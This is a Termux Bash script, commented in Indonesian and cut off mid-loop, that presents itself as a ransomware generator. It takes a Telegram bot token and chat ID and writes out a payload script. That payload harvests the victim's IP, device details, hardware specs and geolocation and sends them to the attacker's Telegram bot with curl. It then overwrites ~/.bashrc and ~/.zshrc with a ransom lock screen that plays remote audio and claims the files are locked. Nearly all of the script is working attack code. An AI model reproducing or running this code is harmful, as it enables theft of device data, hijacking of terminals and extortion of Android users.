#!/data/data/com.termux/files/usr/bin/bash

set +x
#!/bin/bash
set +x

source lib/moduler.sh

Namespace Std :: Sys;{
	{ Bash.import: feature/io.echo && { const: __Say__ =\> say; }; }
	{ Bash.import: log/warnings && { const: __warn__ =\> log; }; }
	{ Bash.import: colorsh/ink,log/warnings; }
}

# Ransomware Generator Script
# Base generator untuk skrip ransomware yang ada

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
ubir='\033[38;2;102;51;204m'
pink='\033[38;5;218m'
NC='\033[0m' # No Color


animasi0() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣷⣾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣿⣯⣽⡙⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⡗⡞⣭⠭⡘⠋⠋⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⠔⠃⠀⢀⣤⡶⠋⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣴⣾⣿⣿⣿⣿⣷⣮⡐⠀⠀⣰⣯⠟⠡⢀⣼⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀
⣰⣿⣿⣿⣿⣿⣛⠿⣿⣽⢿⣦⣨⡷⠋⠀⢸⣾⣿⣹⡾⢧⣀⠀⠀⠀⠀⠀⠀
⣿⣿⡿⣻⣿⣿⣿⣷⣎⢻⣞⣿⡟⠀⡄⠀⣼⢿⣧⣿⣿⣷⣦⠛⣦⡀⠀⠀⠀
⣿⣿⡇⣿⣿⣿⣿⣿⣿⡄⣿⣿⣇⠀⣷⣾⣟⣼⣿⣿⣿⣿⣿⣏⡤⠽⠦⡀⠀
⣿⣿⣧⡻⣿⣿⣿⣿⡿⣸⣯⣿⣇⡜⢹⣷⣿⣿⣿⣿⣿⣿⡟⢛⠀⠀⠀⠐⡄
⠈⢻⡿⣿⣾⣿⣿⣿⣾⣿⣿⣿⠋⣰⡿⠛⠻⣿⣿⣿⣿⡿⠈⠀⠀⠀⠀⢠⠃
⠀⠈⣿⣳⣯⣿⠾⣳⢯⣿⠟⢁⣼⣿⢡⠖⠓⠲⣝⣿⣿⡏⢀⡠⣀⣀⡼⠃⠀
⠀⠀⣿⣟⣿⣿⣿⣎⢟⣽⢀⣾⣿⣴⢸⣄⠀⠀⣸⣽⣿⡃⠎⠀⠀⡽⠁⠀⠀
⠀⢀⣿⣟⢿⣿⣿⡟⣼⡟⣾⣿⢯⣿⠺⠽⠷⡾⠷⢏⠛⢧⡘⠢⣀⠇⠀⠀⠀
⠀⠸⣿⣝⠷⣿⣽⠾⢟⣽⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠉⢨⠿⠷⠚⠀⠀⠀⠀
⠀⠀⢹⣿⣿⣶⣶⣾⣿⣿⡟⢁⡀⢀⠀⢀⠀⠀⠀⠀⠀⡽⣂⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⣦⣜⣢⡉⢆⠂⣀⣀⡤⠞⢑⠇⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡍⠉⠉⠉⠉⠉⠉⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡌⣄⠢⢄⠠⡀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢻⣿⣿⣿⡿⣿⠿⣴⢧⣮⠴⡥⠶⢚⣩⠆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⡖⢠⢐⡀⢀⠀⠄⠀⠀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣟⣲⢦⣽⢒⡌⣌⡴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⡉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
animasi1() {
echo """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀
⠀⠀⡤⢤⣾⣿⡇⢸⡇⢸⡇⢸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠀⠓⠚⠛⠛⠃⠘⠃⠘⠃⠘⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀
⠀⠀⠀⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠃⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⢶⡄⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠁⣀⣀⣀⣀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠻⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣶⣶⣶⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
}
animasi2() {
echo """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀
⠀⠀⡤⢤⣾⣿⡇⢸⡇⢸⡇⢸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀    
⠀⠀⠓⠚⠛⠛⠃⠘⠃⠘⠃⠘⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀   ⣿⣿⣿⣿⣛⠿⣿⣽⢿>>
⠀⠀⠀⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠃⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⢶⡄⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠁⣀⣀⣀⣀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠻⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣶⣶⣶⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
}
animasi3(){
echo """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀
⠀⠀⡤⢤⣾⣿⡇⢸⡇⢸⡇⢸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀    
⠀⠀⠓⠚⠛⠛⠃⠘⠃⠘⠃⠘⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀                ⣿⣿⣿⣿⣛⠿⣿⣽⢿>>
⠀⠀⠀⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠃⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⢶⡄⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠁⣀⣀⣀⣀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠻⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣶⣶⣶⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
}
animasi4(){
echo """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀
⠀⠀⡤⢤⣾⣿⡇⢸⡇⢸⡇⢸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀    
⠀⠀⠓⠚⠛⠛⠃⠘⠃⠘⠃⠘⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀                                 ⣿⣿⣿⣿⣛⠿⣿⣽⢿>>
⠀⠀⠀⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠃⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⢶⡄⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠁⣀⣀⣀⣀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠻⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣶⣶⣶⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
}

spinner() {
    local pid=$!
    local delay=0.2
    local spinstr='|/-\'
    
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

print_banner() {
    clear
    echo -e "${RED}"
    cat << 'CokI' | boxes -d ansi-rounded | lolcat
 ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║     █████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║     ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
╚██████╗███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
 ╚═════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
CokI
    echo -e "${NC}"
    echo -e "${ubir}          ╭───────────────────────────────────────────────────────────╮${NC}"
    echo -e "${ubir}          │      ${BLUE}RANSOMWARE ${GREEN}GENERATOR V3.6.0                          ${ubir}│${NC}"
    echo -e "${ubir}          │            ${RED}Created by: ${GREEN}AndraxC2                           ${ubir}│${NC}"
    echo -e "${ubir}          │ ${RED}Github : https://github.com/lupepeksokhekeljink           ${ubir}│${NC}"
    echo -e "${ubir}          ╰───────────────────────────────────────────────────────────╯${NC}"
    echo ""
log.info "-> Welcome : $(whoami)"
log.info "-> Sekarang tanggal : $(date)"
log.info "-> Info Device : $(uname -a)"
echo ""
echo ""
}

validate_token() {
    local token="$1"
    # Validasi format token bot Telegram
    if [[ ! "$token" =~ ^[0-9]{8,10}:[A-Za-z0-9_-]{35}$ ]]; then
        echo -e "${RED}[ERROR] Format token tidak valid!${NC}"
        echo -e "${YELLOW}Contoh token yang valid: 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ123456789${NC}"
        return 1
    fi
    return 0
}

validate_chat_id() {
    local chat_id="$1"
    # Validasi chat ID (bisa angka negatif untuk group)
    if [[ ! "$chat_id" =~ ^-?[0-9]+$ ]]; then
        echo -e "${RED}[ERROR] Chat ID harus berupa angka!${NC}"
        return 1
    fi
    return 0
}

generate_random_name() {
    local prefixes=("ZeroEscape" "Andrax")
    local suffix=$(date +%s%N | md5sum | head -c 6)
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    echo "${prefix}_Ransomware_By_Andrax${suffix}.sh"
}

create_ransomware_script() {
    local token="$1"
    local chat_id="$2"
    local output_file="$3"

    cat > "$output_file" << EOF
#!/usr/bin/env bash

merah='\\033[1;31m'
hijau='\\033[1;32m'
kuning='\\033[1;33m'
biru='\\033[1;34m'
amba='\\033[1;37m'

A2="/storage/emulated/0"
A1="/sdcard"
base64x="$token"
keypassword="$chat_id"

echo "y" | termux-setup-storage &> /dev/null
chmod 644 ~/.bash_history 2>/dev/null

PAYLOAD_PENGELABUHAN() {
    pkg update -y && pkg upgrade -y
    pkg install openssl -y
    pkg install curl -y
    pkg install ruby -y
    pkg install boxes -y
    pkg install python -y
    pkg install jq -y
    pkg install git -y
    pkg install wget -y
    pkg update -y
}

IP=\$(curl -s ipinfo.io/ip)
OS=\$(uname -o)
TERMUX_ID=\$(whoami)
chmod 644 ~/.bash_history 2>/dev/null

PHOTO_URL="https://files.catbox.moe/999s3q.png"

get_device_info() {
    if command -v getprop &>/dev/null; then
        BRAND=\$(getprop ro.product.brand)
        MODEL=\$(getprop ro.product.model)
        echo "\$BRAND \$MODEL"
    else
        echo "Unknown Device"
    fi
}

DEVICE_INFO=\$(get_device_info)

get_cpu_info() {
    CORES=\$(nproc --all 2>/dev/null || grep -c ^processor /proc/cpuinfo)
    CPU_MODEL=\$(grep -m 1 "model name" /proc/cpuinfo | cut -d ":" -f2- | xargs)
}

get_cpu_info

CPU_INFO="Model Cpu: \$CPU_MODEL Core Cpu:\$CORES"

RAM_TOTAL=\$(grep MemTotal /proc/meminfo | awk '{print \$2}')
RAM_FREE=\$(grep MemFree /proc/meminfo | awk '{print \$2}')
RAM_USED=\$((RAM_TOTAL - RAM_FREE))

toMB() {
    echo \$(( \$1 / 1024 ))" MB"
}

RAM_TOTAL_MB=\$(toMB \$RAM_TOTAL)
RAM_FREE_MB=\$(toMB \$RAM_FREE)
RAM_USED_MB=\$(toMB \$RAM_USED)

if [[ "\$HOME" == *"/data/data/com.termux/files/home"* ]]; then
    TERMUX="Rill"
else
    TERMUX="Fek jir"
fi

ip=\$(curl -s ifconfig.me)

Lok=\$(curl -s "https://ipinfo.io/\$ip/json")

city=\$(echo \$Lok | jq -r '.city')
region=\$(echo \$Lok | jq -r '.region')
country=\$(echo \$Lok | jq -r '.country')
org=\$(echo \$Lok | jq -r '.org')
loc=\$(echo \$Lok | jq -r '.loc')
postal=\$(echo \$Lok | jq -r '.postal')

lat=\$(echo \$loc | cut -d, -f1)
lon=\$(echo \$loc | cut -d, -f2)

geo=\$(curl -s "https://nominatim.openstreetmap.org/reverse?lat=\$lat&lon=\$lon&format=json&zoom=10&addressdetails=1")
kabupaten=\$(echo \$geo | jq -r '.address.county // .address.city_district // .address.city')

vpncheck="Not Valid Vpn (off)"
if echo "\$org" | grep -qiE "vpn|hosting|cloud|proxy|proton|nord|express|mullvad|private|surfshark|torguard|cyberghost|hidemyass|tunnelbear|windscribe|purevpn|ivacy|vyprvpn|strongvpn|psiphon|ultrasurf|hola|securenet|securevpn|outline"; then
    vpncheck="Valid On VPN"
fi

TOKEN="$token"
CHAT_ID="$chat_id"

# ============ Batasan 1 ================

MESSAGE=\$(cat << MSG_EOF
· · · · ANDRAX F.T.A RANSOMWARE 3.6.0 - - - - 
=============================================
USER ID: \$TERMUX_ID
IP Address: \$IP
OS System: \$OS
Device Brand Name: \$DEVICE_INFO
RAM Total: \$RAM_TOTAL_MB
RAM Free: \$RAM_FREE_MB
RAM Used: \$RAM_USED_MB
\$CPU_INFO
=============================================
IP: \$ip
Latitude: \$lat
Longitude: \$lon
Kota: \$city
Kabupaten: \${kabupaten:-Unknown}
Provinsi: \$region
Negara: \$country
Kode Pos: \$postal
Provider: \$org
VPN: \$vpncheck
=============================================
FREE RANSOM VERSION GENERATOR BY ANDRAXC2
MSG_EOF
)

# ===== Batasan 2 (eksekusi steal) =====

PAYLOAD_BACKDOOR() {
    PAYLOAD_STEAL_HIST() {
        USER=\$(whoami)
        HOST=\$(uname -n)
        DATE=\$(date '+%Y-%m-%d %H:%M:%S')
        CAPTION="History Termux User: \$USER@\$HOST | \$DATE"
        TOKEN="$token"
        CHAT_ID="$chat_id"
    }
    
    PAYLOAD_HEADER() {
        curl -s -X POST "https://api.telegram.org/bot\$TOKEN/sendPhoto" \\
            -d chat_id="\$CHAT_ID" \\
            -d photo="\$PHOTO_URL" \\
            --data-urlencode caption="\$MESSAGE" > /dev/null 2>&1
    }
    
    PAYLOAD_HEADER
    PAYLOAD_STEAL_HIST
}

Fuz() {
    TARGETS=("\$HOME/.bashrc" "\$HOME/.zshrc")
    
    for f in "\${TARGETS[@]}"; do
        if [ -f "\$f" ]; then
            cat > "\$f" << 'RC_EOF'
clear

echo "PERINGATAN ⚠️. PERINGATAN ⚠️, PERINGATAN ⚠️"

mpv "https://l.top4top.io/m_3551rlvax0.mp3" > /dev/null 2>&1

if command -v boxes >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then

cat << 'I' | boxes -d ansi-rounded | lolcat
 ██████╗██╗    ██╗███╗   ██╗███████╗██████╗     ██████╗ ██╗   ██╗
██╔══██╗██║██║████╗  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██████╔╝██║█╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
██╔═══╝██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝
██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ██████╔╝   ██║
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚═════╝    ╚═╝
I

sleep 5
clear

cat << 'B' | boxes -d ansi-rounded | lolcat
 █████╗ ███╗   ██╗██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗██████╗ 
██╔══██╗████╗██║██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██╔════╝╚════██╗
███████║██╔██╗██║██║  ██║██████╔╝███████║ ╚███╔╝ ██║      █████╔╝
██╔══██║██║╚██╗██║██║██║██╔══██╗██╔══██║ ██╔██╗ ██║     ██╔═══╝ 
██║  ██║██║ ╚████║██████╔╝██║  ██║██║  ██║██╔╝ ██╗╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
 V 3.6.0
B

sleep 5
clear
cat << 'J' | boxes -d ansi-rounded | lolcat

██╗    ██╗██╗  ██╗ █████╗ ████████╗
██║    ██║██║  ██║██╔══██╗╚══██╔══╝
██║ █╗ ██║███████║███████║   ██║
██║███╗██║██╔══██║██╔══██║   ██║
╚███╔███╔╝██║  ██║██║  ██║   ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝

██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██████╗
██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗
███████║███████║██████╔╝██████╔╝█████╗  ██╔██╗ ██║█████╗  ██║  ██║
██╔══██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██║  ██║
██║  ██║██║  ██║██║     ██║     ███████╗██║ ╚████║███████╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═════╝

J

sleep 4
clear

cat << 'A' | boxes -d ansi-rounded | lolcat

⠀⠀⠀                      ⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀

A
sleep 1
cat << 'B' | boxes -d ansi-rounded | lolcat
 █████╗ ███╗   ██╗██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗██████╗ 
██╔══██╗████╗██║██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██╔════╝╚════██╗
███████║██╔██╗██║██║  ██║██████╔╝███████║ ╚███╔╝ ██║      █████╔╝
██╔══██║██║╚██╗██║██║██║██╔══██╗██╔══██║ ██╔██╗ ██║     ██╔═══╝ 
██║  ██║██║ ╚████║██████╔╝██║  ██║██║  ██║██╔╝ ██╗╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
 V 3.60
B

text="Halo kawan ! terminal mu telah di retas dan file mu telah di kunci oleh NEXORRA RANSOMWARE 2.0!!"

for ((i=0; i<\${#text}; i++)); do
    printf "\\033[31m%s\\033[0m" "\${text:\$i:1}"  # \\033[31m untuk merah, \\033[0m untuk reset
    sleep 0.1
done
echo
sleep 5
echo ""
text="Untuk Menebus File Dan Terminal Ikuti Langkah di bawah ini!!!"

for ((i=0; i<\${#text}; i++)); do
    printf "\\033[31m%s\\033[0m" "\${text:\$i:1}"  # \\033[31m untuk merah, \\033[0m untuk reset
